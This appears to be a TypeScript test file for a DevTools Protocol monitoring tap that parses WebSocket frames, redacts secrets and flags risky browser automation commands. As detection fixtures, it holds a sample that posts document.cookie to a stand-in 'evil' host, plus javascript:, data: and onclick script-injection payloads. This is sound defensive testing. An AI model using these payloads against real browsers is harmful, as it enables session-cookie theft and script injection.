import { test } from 'node:test'
import assert from 'node:assert/strict'
import crypto from 'node:crypto'
import { CdpSessionTap, WsFrameParser, createDriveVaultTap, type CdpEntry } from '../src/cdp-tap.ts'
import { InFlightBudgetTracker } from '../src/proxy.ts'
import { SecretVault } from '../src/redact.ts'

function encodeWsFrame(payload: Buffer, opts: { fin?: boolean; opcode?: number; mask?: boolean; rsv?: number } = {}): Buffer {
  const fin = opts.fin ?? true
  const opcode = opts.opcode ?? 0x1
  const mask = opts.mask ?? true
  const rsv = opts.rsv ?? 0
  const b0 = (fin ? 0x80 : 0) | (rsv & 0x70) | (opcode & 0x0f)
  const len = payload.length
  let header: Buffer
  if (len < 126) {
    header = Buffer.from([b0, (mask ? 0x80 : 0) | len])
  } else if (len < 65536) {
    header = Buffer.alloc(4)
    header[0] = b0
    header[1] = (mask ? 0x80 : 0) | 126
    header.writeUInt16BE(len, 2)
  } else {
    header = Buffer.alloc(10)
    header[0] = b0
    header[1] = (mask ? 0x80 : 0) | 127
    header.writeBigUInt64BE(BigInt(len), 2)
  }
  if (!mask) return Buffer.concat([header, payload])
  const key = crypto.randomBytes(4)
  const masked = Buffer.allocUnsafe(len)
  for (let i = 0; i < len; i++) masked[i] = payload[i] ^ key[i & 3]
  return Buffer.concat([header, key, masked])
}

test('WsFrameParser handles 1-byte chunk splits, FIN=0 fragmentation with interleaved Ping/Pong, binary frames, and never mutates input buffers', () => {
  const msgs: any[] = []
  const errors: string[] = []
  const parser = new WsFrameParser(m => msgs.push(m), e => errors.push(e))

  const part1 = Buffer.from('{"id":1,"method":"Page.na')
  const part2 = Buffer.from('vigate","params":{"url":"https://a.example/"}}')
  const f1 = encodeWsFrame(part1, { fin: false, opcode: 0x1 })
  const ping = encodeWsFrame(Buffer.from('hi'), { fin: true, opcode: 0x9 })
  const f2 = encodeWsFrame(part2, { fin: true, opcode: 0x0 })
  const bin = encodeWsFrame(Buffer.from('{"id":2,"method":"Page.reload"}'), { fin: true, opcode: 0x2 })

  const wire = Buffer.concat([f1, ping, f2, bin])
  const snapshot = Buffer.from(wire)

  // Feed 1 byte at a time!
  for (let i = 0; i < wire.length; i++) {
    parser.feed(wire.subarray(i, i + 1))
  }
  assert.ok(wire.equals(snapshot), 'input buffer never mutated')
  assert.equal(errors.length, 0)
  assert.equal(msgs.length, 2)
  assert.equal(msgs[0].head.toString(), '{"id":1,"method":"Page.navigate","params":{"url":"https://a.example/"}}')
  assert.equal(msgs[1].head.toString(), '{"id":2,"method":"Page.reload"}')
})

test('WsFrameParser protocol violations emit _tap.disabled and oversized messages emit _tap.oversized unless allowlisted by exact SHA-256', () => {
  const allowPayload = Buffer.from(JSON.stringify({ id: 1, method: 'Runtime.evaluate', params: { expression: 'x'.repeat(70_000) } }))
  const allowSha = crypto.createHash('sha256').update(allowPayload).digest('hex')

  const tap = new CdpSessionTap({
    projection: 'semantic',
    isLive: () => false,
    coalesceMs: 10,
    injectedScriptSha256Allowlist: new Set([allowSha]),
  })
  const c1 = tap.attachConnection()
  // Allowlisted oversized script is exempted cleanly
  c1.feed(encodeWsFrame(allowPayload))
  // Non-allowlisted oversized message -> _tap.oversized (severity: 'high')
  const bigPayload = Buffer.from(JSON.stringify({ id: 2, method: 'Runtime.evaluate', params: { expression: 'y'.repeat(70_000) } }))
  c1.feed(encodeWsFrame(bigPayload))

  // Non-zero RSV triggers _tap.disabled (severity: 'high')
  const c2 = tap.attachConnection()
  c2.feed(encodeWsFrame(Buffer.from('{"method":"Page.reload"}'), { rsv: 0x40 }))

  // Unmasked client->server frame triggers _tap.disabled (severity: 'high')
  const c3 = tap.attachConnection()
  c3.feed(encodeWsFrame(Buffer.from('{"method":"Page.reload"}'), { mask: false }))

  tap.seal()
  const entries = tap.entries.filter((e): e is CdpEntry => e.rec !== '_tap.summary')
  assert.ok(entries.some(e => e.method === '_tap.oversized' && e.severity === 'high' && e.summary?.bytes === bigPayload.length))
  assert.ok(entries.some(e => e.method === '_tap.disabled' && e.severity === 'high'))
  const summary = tap.entries.find(e => e.rec === '_tap.summary') as any
  assert.equal(summary.methodCounts['_playwright.injectedScript'], 1)
  assert.equal(summary.tapDisabledCount, 2)
})

test('CdpSessionTap parses Playwright 1.64 Runtime.callFunctionOn, input length-only, names-only network/storage, recursion depth, high-severity, and coalescing', async () => {
  const vault = new SecretVault()
  vault.addTrustedDrive('SecretArgValue')
  let uploadTriggered = 0
  const tap = new CdpSessionTap({
    projection: 'semantic+samples',
    vault,
    isLive: () => false,
    coalesceMs: 40,
    onFileUpload: () => { uploadTriggered++ },
  })
  const conn = tap.attachConnection()
  const send = (obj: unknown) => conn.feed(encodeWsFrame(Buffer.from(JSON.stringify(obj))))

  // 1. Playwright 1.64 utilityScript.evaluate wrapper with user args & new Function smuggling
  send({
    id: 1,
    sessionId: 's1',
    method: 'Runtime.callFunctionOn',
    params: {
      functionDeclaration: '(utilityScript, ...args) => utilityScript.evaluate(...args)',
      objectId: 'obj-1',
      arguments: [
        { objectId: 'obj-1' },
        { value: true },
        { value: true },
        { value: '(code) => new Function(code)()' },
        { value: 1 },
        { value: 'fetch("/pay") // SecretArgValue' },
      ],
    },
  })

  // 2. Input.insertText -> length ONLY, zero text!
  send({ id: 2, sessionId: 's1', method: 'Input.insertText', params: { text: 'TopSecretPassword' } })

  // 3. DOM.setFileInputFiles -> triggers onFileUpload
  send({ id: 3, sessionId: 's1', method: 'DOM.setFileInputFiles', params: { files: ['/tmp/invoice.pdf'] } })

  // 4. Network.setExtraHTTPHeaders & DOMStorage.setDOMStorageItem -> names only!
  send({ id: 4, sessionId: 's1', method: 'Network.setExtraHTTPHeaders', params: { headers: { Authorization: 'Bearer secret123', 'X-Trace': '1' } } })
  send({ id: 5, sessionId: 's1', method: 'DOMStorage.setDOMStorageItem', params: { key: 'auth_state', value: 'raw-token-value' } })

  // 5. High-severity javascript: navigate & DOM.setAttributeValue (name only)
  send({ id: 6, sessionId: 's1', method: 'Page.navigate', params: { url: 'javascript:alert(1)' } })
  send({ id: 7, sessionId: 's1', method: 'DOM.setAttributeValue', params: { name: 'onclick', value: 'steal()' } })

  // 6. Nested Target.sendMessageToTarget (depth 1 -> captured; depth 3 -> depthLimited)
  const inner = JSON.stringify({ id: 8, method: 'Page.reload' })
  send({ id: 9, method: 'Target.sendMessageToTarget', params: { sessionId: 'nested-1', message: inner } })
  const deep3 = JSON.stringify({
    method: 'Target.sendMessageToTarget',
    params: { message: JSON.stringify({ method: 'Target.sendMessageToTarget', params: { message: inner } }) },
  })
  send({ id: 10, method: 'Target.sendMessageToTarget', params: { message: deep3 } })

  // 7. Coalescing repeated identical mouse clicks (held until seal or coalesceMs, never mutating emitted record!)
  for (let i = 0; i < 3; i++) {
    send({ id: 20 + i, sessionId: 's1', method: 'Input.dispatchMouseEvent', params: { type: 'mousePressed', button: 'left', x: 100, y: 200 } })
  }

  // 8. Duplicate top-level method key -> ambiguous: true, severity: 'high'
  conn.feed(encodeWsFrame(Buffer.from('{"id":30,"method":"Page.reload","method":"Runtime.evaluate","params":{"expression":"1+1"}}')))

  tap.seal()

  assert.equal(uploadTriggered, 1)
  const entries = tap.entries.filter((e): e is CdpEntry => e.rec !== '_tap.summary')
  const callFn = entries.find(e => e.method === 'Runtime.callFunctionOn')!
  assert.equal(callFn.summary?.wrapper, 'playwright-utility')
  assert.equal(typeof callFn.summary?.fnLen, 'number')
  assert.equal(typeof callFn.summary?.fnHash64, 'string')
  assert.equal(callFn.summary?.argc, 1)
  assert.ok((callFn.summary?.argSummary as any)[0].preview.includes('[REDACTED:vault]'))
  assert.ok(!JSON.stringify(callFn).includes('SecretArgValue'))

  const ins = entries.find(e => e.method === 'Input.insertText')!
  assert.deepEqual(ins.summary, { len: 'TopSecretPassword'.length })
  assert.ok(!JSON.stringify(ins).includes('TopSecretPassword'))

  const hdrs = entries.find(e => e.method === 'Network.setExtraHTTPHeaders')!
  assert.deepEqual(hdrs.summary, { headerNames: ['Authorization', 'X-Trace'] })
  assert.ok(!JSON.stringify(hdrs).includes('secret123'))

  const domSt = entries.find(e => e.method === 'DOMStorage.setDOMStorageItem')!
  assert.deepEqual(domSt.summary, { key: 'auth_state' })
  assert.ok(!JSON.stringify(domSt).includes('raw-token-value'))

  const jsNav = entries.find(e => e.method === 'Page.navigate')!
  assert.equal(jsNav.severity, 'high')

  const attr = entries.find(e => e.method === 'DOM.setAttributeValue')!
  assert.equal(attr.severity, 'high')
  assert.deepEqual(attr.summary, { name: 'onclick' })
  assert.ok(!JSON.stringify(attr).includes('steal()'))

  const clicks = entries.find(e => e.method === 'Input.dispatchMouseEvent')!
  assert.equal(clicks.count, 3, 'coalesced 3 identical clicks before cursor emission')

  const ambig = entries.find(e => e.ambiguous === true)
  assert.ok(ambig && ambig.severity === 'high')

  const summary = tap.entries.find(e => e.rec === '_tap.summary') as any
  assert.equal(summary.depthLimited, 1)
})

test('unknown CDP method names are bounded to 256 in _tap.summary and createDriveVaultTap feeds SecretVault in memory only', () => {
  const tap = new CdpSessionTap({ projection: 'semantic', isLive: () => false })
  const conn = tap.attachConnection()
  for (let i = 0; i < 300; i++) {
    conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: i, method: `Custom.Method${i}` }))))
  }
  tap.seal()
  const summary = tap.entries.find(e => e.rec === '_tap.summary') as any
  const nonOverflow = Object.keys(summary.methodCounts).filter(k => k !== '_unknown_other')
  assert.equal(nonOverflow.length, 256)
  assert.equal(summary.methodCounts._unknown_other, 44)

  // Concurrent drive vault taps keep isolated edit buffers
  const vault = new SecretVault()
  const drive1 = createDriveVaultTap(vault)
  const drive2 = createDriveVaultTap(vault)
  drive1.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 1, method: 'Input.insertText', params: { text: '654' } }))))
  drive2.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 1, method: 'Input.insertText', params: { text: 'AlphaPass' } }))))
  drive1.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 2, method: 'Input.insertText', params: { text: '321' } }))))
  drive1.close()
  drive2.close()
  assert.equal(vault.scrub('code=654321 pw=AlphaPass').text, 'code=[REDACTED:vault] pw=[REDACTED:vault]')
})

test('P1-1 impostor Playwright wrapper is rejected, flagged high severity, and records fnLen/fnHash64/fn', () => {
  const tap = new CdpSessionTap({ projection: 'semantic+samples', isLive: () => false, coalesceMs: 10 })
  const conn = tap.attachConnection()
  const impostor = {
    id: 1,
    sessionId: 's1',
    method: 'Runtime.callFunctionOn',
    params: {
      functionDeclaration: "(u)=>{fetch('https://evil/x',{method:'POST',body:document.cookie})} /* utilityScript.evaluate */",
      objectId: 'obj-1',
      arguments: [
        { objectId: 'obj-1' },
        { value: true },
        { value: true },
        { value: '() => 1' },
        { value: 0 },
      ],
    },
  }
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify(impostor))))
  tap.seal()
  const entry = tap.entries.find((e): e is CdpEntry => e.method === 'Runtime.callFunctionOn')!
  assert.equal(entry.summary?.wrapper, 'impostor')
  assert.equal(entry.severity, 'high')
  assert.ok((entry.summary?.fnLen as number) > 50)
  assert.equal(typeof entry.summary?.fnHash64, 'string')
  assert.match(String(entry.summary?.fn), /evil\/x/)
})

test('P1-2 17 unfinished fragmented CDP frames exhausting parser budget never disable main connection tap and keep counting methods', () => {
  const tap = new CdpSessionTap({ projection: 'semantic', isLive: () => false, coalesceMs: 10, maxParserBytes: 1024 * 1024 })
  // 17 extra connections each start a 62 KiB unfinished fragmented frame (FIN=0) holding 1 MiB
  const chunk62k = Buffer.alloc(62 * 1024, 0x41)
  for (let i = 0; i < 17; i++) {
    const c = tap.attachConnection()
    c.feed(encodeWsFrame(chunk62k, { fin: false, opcode: 0x1 }))
  }
  // Main connection still tracks frames, sniffs method, counts Runtime.evaluate, and never disables!
  const main = tap.attachConnection()
  main.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 1, method: 'Runtime.evaluate', params: { expression: '1+1' } }))))
  main.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 2, method: 'Page.reload' }))))
  tap.seal()

  const summary = tap.entries.find(e => e.rec === '_tap.summary') as any
  assert.equal(summary.tapDisabledCount, 0, 'budget exhaustion must never disable tap')
  assert.equal(summary.methodCounts['Runtime.evaluate'], 1, 'Runtime.evaluate counted despite exhausted parser budget')
  assert.equal(summary.methodCounts['Page.reload'], 1, 'subsequent frame boundaries still tracked')
  const oversized = tap.entries.filter((e): e is CdpEntry => e.method === '_tap.oversized')
  assert.ok(oversized.some(e => e.severity === 'high' && e.summary?.reason === 'budget' && e.summary?.innerMethod === 'Runtime.evaluate'))
})

test('P2-12/13/14 non-http nav URLs preserve scheme, prototype method names stay safe, and unparseable text frames are traced', () => {
  const tap = new CdpSessionTap({ projection: 'semantic', isLive: () => false, coalesceMs: 10 })
  const conn = tap.attachConnection()
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 1, method: 'Page.navigate', params: { url: 'data:text/html,<script>alert(1)</script>' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 2, method: '__proto__' }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 3, method: 'constructor' }))))
  conn.feed(encodeWsFrame(Buffer.from('not-valid-json{{{')))
  tap.seal()

  const nav = tap.entries.find((e): e is CdpEntry => e.method === 'Page.navigate')!
  assert.equal(nav.severity, 'high')
  assert.match(String(nav.summary?.url), /^data:text\/html;len=/)
  assert.ok(!String(nav.summary?.url).includes('<script>'))

  const unparsed = tap.entries.find((e): e is CdpEntry => e.method === '_tap.unparsed')
  assert.ok(unparsed && unparsed.severity === 'high')

  const summary = tap.entries.find(e => e.rec === '_tap.summary') as any
  assert.equal(summary.methodCounts._unknown_other, 2)
  assert.equal(summary.methodCounts._unparsed, 1)
})

test('R2 CDP nav detects obfuscated javascript:/vbscript:/data: schemes and vault-scrubs non-http nav URLs', () => {
  const vault = new SecretVault()
  vault.addTrustedDrive('tenant-secret-42')
  vault.addTrustedDrive('customsec')
  const tap = new CdpSessionTap({ projection: 'semantic', vault, isLive: () => false, coalesceMs: 10 })
  const conn = tap.attachConnection()

  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 1, method: 'Page.navigate', params: { url: '\u0001java\tscript:alert(1)' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 2, method: 'Page.navigate', params: { url: 'blob:https://tenant-secret-42.example/abc-123' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 3, method: 'Target.createTarget', params: { url: 'customsec:payload' } }))))
  tap.seal()

  const navs = tap.entries.filter((e): e is CdpEntry => e.method === 'Page.navigate' || e.method === 'Target.createTarget')
  assert.equal(navs.length, 3)
  assert.equal(navs[0].severity, 'high')
  assert.equal(navs[0].summary?.url, 'javascript:[REDACTED]')
  assert.equal(navs[1].summary?.url, 'blob:[REDACTED]')
  assert.ok((navs[1].vaultRedactions ?? 0) >= 1)
  assert.equal(navs[2].summary?.url, '[REDACTED]')
  assert.ok((navs[2].vaultRedactions ?? 0) >= 1)
})

test('R2 shared per-session /view/drive parser budget bounds concurrent connections and isolates from proxy/CDP', () => {
  const driveTracker = new InFlightBudgetTracker(8 * 1024 * 1024, 1 * 1024 * 1024, 256 * 1024)
  const vault = new SecretVault()
  const mkCharger = () => ({
    tryAcquire: (b: number) => driveTracker.tryAcquire('c1', 's1', b),
    release: (b: number) => driveTracker.release('c1', 's1', b),
  })

  // Open 6 concurrent /view/drive taps each feeding a 60 KiB unfinished fragmented frame (360 KiB > 256 KiB session cap)
  const taps = Array.from({ length: 6 }, () => createDriveVaultTap(vault, mkCharger()))
  const chunk60k = Buffer.alloc(60 * 1024, 0x42)
  for (const d of taps) {
    d.feed(encodeWsFrame(chunk60k, { fin: false, opcode: 0x1 }))
  }
  assert.ok(driveTracker.getProcessBytes() <= 256 * 1024, `drive budget capped at <=256KiB (got ${driveTracker.getProcessBytes()})`)

  for (const d of taps) d.close()
  assert.equal(driveTracker.getProcessBytes(), 0, 'all drive parser charges released on close')

  // Subsequent /view/drive connection still populates SecretVault cleanly
  const fresh = createDriveVaultTap(vault, mkCharger())
  fresh.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 1, method: 'Input.insertText', params: { text: 'DriveOtp77' } }))))
  fresh.close()
  assert.equal(vault.scrub('v=DriveOtp77').text, 'v=[REDACTED:vault]')
  assert.equal(driveTracker.getProcessBytes(), 0)
})

test('R3 linear C0/space nav URL trim (<50ms on 64 KiB spaces) and mixed-case vault scrub before lowercasing', () => {
  const vault = new SecretVault()
  vault.addTrustedDrive('MixedCaseTenant99')
  vault.addTrustedDrive('MySecScheme')
  vault.addTrustedDrive('MyMimeSec')
  vault.addTrustedDrive('blob:https://FullBlobSecret99.example')
  vault.addTrustedDrive('Mixed\tTenant99')
  const tap = new CdpSessionTap({ projection: 'semantic', vault, isLive: () => false, coalesceMs: 10 })
  const conn = tap.attachConnection()

  const t0 = performance.now()
  // Keep total JSON frame <= MAX_MSG_HEAD (65,536 B) so Page.navigate actually parses & trims ~65.4 KiB of interior spaces!
  const spaceRun = 'a' + ' '.repeat(65_450) + 'b'
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 1, method: 'Page.navigate', params: { url: spaceRun } }))))
  const ms = performance.now() - t0
  assert.ok(ms < 50, `C0/space trim must stay linear (took ${ms.toFixed(2)}ms)`)

  // Mixed-case vault secrets in non-HTTP scheme, data MIME, and blob URLs (with userinfo, tab, full blob secret, and non-canonical \)
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 2, method: 'Page.navigate', params: { url: 'MySecScheme:secret-payload' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 3, method: 'Page.navigate', params: { url: 'data:application/vnd.MyMimeSec+xml,abc' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 4, method: 'Page.navigate', params: { url: 'blob:https://alice:otherpass@MixedCaseTenant99.example/item-1' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 5, method: 'Page.navigate', params: { url: 'blob:https://app.example/clean-uuid' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 6, method: 'Page.navigate', params: { url: 'blob:http:\\MixedCaseTenant99.example/item-2' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 7, method: 'Page.navigate', params: { url: 'blob:file:///tmp/opaque-id' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 8, method: 'Page.navigate', params: { url: 'blob:https://FullBlobSecret99.example/uuid' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 9, method: 'Page.navigate', params: { url: 'blob:https://clean.example/sep1' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 10, method: 'Page.navigate', params: { url: 'blob:https://Mixed\tTenant99.example/uuid' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 11, method: 'Page.navigate', params: { url: 'blob:https://clean.example/sep2' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 12, method: 'Page.navigate', params: { url: 'blob:http:\\clean.example/item' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 13, method: 'Page.navigate', params: { url: 'blob:https://clean.example/sep3' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 14, method: 'Page.navigate', params: { url: 'blob:https://app.example\\item' } }))))
  tap.seal()

  const navs = tap.entries.filter((e): e is CdpEntry => e.method === 'Page.navigate')
  assert.equal(navs.length, 14)
  assert.equal(navs[1].summary?.url, '[REDACTED]')
  assert.ok((navs[1].vaultRedactions ?? 0) >= 1)
  assert.equal(navs[2].severity, 'high')
  assert.match(String(navs[2].summary?.url), /^data:\[REDACTED\];len=/)
  assert.ok((navs[2].vaultRedactions ?? 0) >= 1)
  assert.equal(navs[3].summary?.url, 'blob:[REDACTED]', 'blob with userinfo + vault host must never leak userinfo')
  assert.ok(!String(navs[3].summary?.url).includes('alice'))
  assert.ok((navs[3].vaultRedactions ?? 0) >= 1)
  assert.equal(navs[4].summary?.url, 'blob:https://app.example')
  assert.equal(navs[5].summary?.url, 'blob:[REDACTED]', 'non-canonical blob:http:\\host with vault host fails closed')
  assert.ok((navs[5].vaultRedactions ?? 0) >= 1)
  assert.equal(navs[6].summary?.url, 'blob:null')
  assert.equal(navs[7].summary?.url, 'blob:[REDACTED]', 'vault secret spanning blob: prefix caught before slicing')
  assert.ok((navs[7].vaultRedactions ?? 0) >= 1)
  assert.equal(navs[9].summary?.url, 'blob:[REDACTED]', 'vault secret containing tab caught before control stripping')
  assert.ok((navs[9].vaultRedactions ?? 0) >= 1)
  assert.equal(navs[11].summary?.url, 'blob:[REDACTED]', 'vault-miss non-canonical blob:http:\\clean.example fails closed')
  assert.equal(navs[13].summary?.url, 'blob:[REDACTED]', 'vault-miss backslash terminator blob:https://app.example\\item fails closed')
})

test('R6 unified pre-lowercasing vault check covers mixed-case HTTPS hosts and control-stripped data:/custom schemes on Page.navigate & Target.createTarget', () => {
  const vault = new SecretVault()
  vault.addTrustedDrive('MixedTenant99')
  vault.addTrustedDrive('MyMimeSec')
  vault.addTrustedDrive('MySecScheme')
  vault.addTrustedDrive('MyVaultSecret99')
  const tap = new CdpSessionTap({ projection: 'semantic', vault, isLive: () => false, coalesceMs: 10 })
  const conn = tap.attachConnection()

  // 1. Mixed-case HTTPS hostname on both Page.navigate and Target.createTarget
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 1, method: 'Page.navigate', params: { url: 'https://MixedTenant99.example/' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 2, method: 'Target.createTarget', params: { url: 'https://MixedTenant99.example/' } }))))
  // 2. Control-char-split mixed-case HTTPS hostname
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 3, method: 'Page.navigate', params: { url: 'https://app.example/cb?token=MyVaultSecret99' } }))))
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 4, method: 'Page.navigate', params: { url: 'https://Mixed\tTenant99.example/' } }))))
  // 3. Control-char-split data: MIME
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 5, method: 'Page.navigate', params: { url: 'data:application/MyMi\tmeSec,abc' } }))))
  // 4. Control-char-split custom scheme
  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 6, method: 'Target.createTarget', params: { url: 'MySec\tScheme:abc' } }))))
  tap.seal()

  const navs = tap.entries.filter((e): e is CdpEntry => e.method === 'Page.navigate' || e.method === 'Target.createTarget')
  assert.equal(navs.length, 6)
  assert.equal(navs[0].summary?.url, 'https://[REDACTED]')
  assert.equal(navs[0].vaultRedactions, 1)
  assert.equal(navs[1].summary?.url, 'https://[REDACTED]')
  assert.equal(navs[1].vaultRedactions, 1)
  // Clean host with vaulted query param still preserves host + path!
  assert.equal(navs[2].summary?.url, 'https://app.example/cb?token=[REDACTED:vault]')
  assert.equal(navs[2].vaultRedactions, 1)
  assert.equal(navs[3].summary?.url, 'https://[REDACTED]')
  assert.equal(navs[3].vaultRedactions, 1)
  assert.equal(navs[4].severity, 'high')
  assert.match(String(navs[4].summary?.url), /^data:\[REDACTED\];len=/)
  assert.equal(navs[4].vaultRedactions, 1)
  assert.equal(navs[5].summary?.url, '[REDACTED]')
  assert.equal(navs[5].vaultRedactions, 1)

  // R7 probe 1: non-canonical triple-slash HTTPS authority + unrelated query hit fails closed on both Page.navigate & Target.createTarget
  const v7 = new SecretVault()
  v7.addTrustedDrive('MixedTenant99')
  v7.addTrustedDrive('OtherSecret')
  v7.addTrustedDrive('javascript')
  const tap7 = new CdpSessionTap({ projection: 'semantic', vault: v7, isLive: () => false, coalesceMs: 10 })
  const c7 = tap7.attachConnection()
  c7.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 1, method: 'Page.navigate', params: { url: 'https:///MixedTenant99.example/?q=%4FtherSecret' } }))))
  c7.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 2, method: 'Target.createTarget', params: { url: 'https:///MixedTenant99.example/?q=%4FtherSecret' } }))))
  // R7 probe 2: uppercase JAVASCRIPT:0 with lowercase 'javascript' vaulted is caught by unconditional final exit gate
  c7.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 3, method: 'Page.navigate', params: { url: 'JAVASCRIPT:0' } }))))
  tap7.seal()

  const navs7 = tap7.entries.filter((e): e is CdpEntry => e.method === 'Page.navigate' || e.method === 'Target.createTarget')
  assert.equal(navs7.length, 3)
  assert.equal(navs7[0].summary?.url, 'https://[REDACTED]')
  assert.ok(!String(navs7[0].summary?.url).includes('mixedtenant99'))
  assert.ok((navs7[0].vaultRedactions ?? 0) >= 1)
  assert.equal(navs7[1].summary?.url, 'https://[REDACTED]')
  assert.ok(!String(navs7[1].summary?.url).includes('mixedtenant99'))
  assert.ok((navs7[1].vaultRedactions ?? 0) >= 1)
  assert.equal(navs7[2].severity, 'high')
  assert.ok(!String(navs7[2].summary?.url).includes('javascript'), 'final exit gate must scrub lowercased javascript scheme')
  assert.equal(navs7[2].summary?.url, '[REDACTED]')
  assert.ok((navs7[2].vaultRedactions ?? 0) >= 1)
})
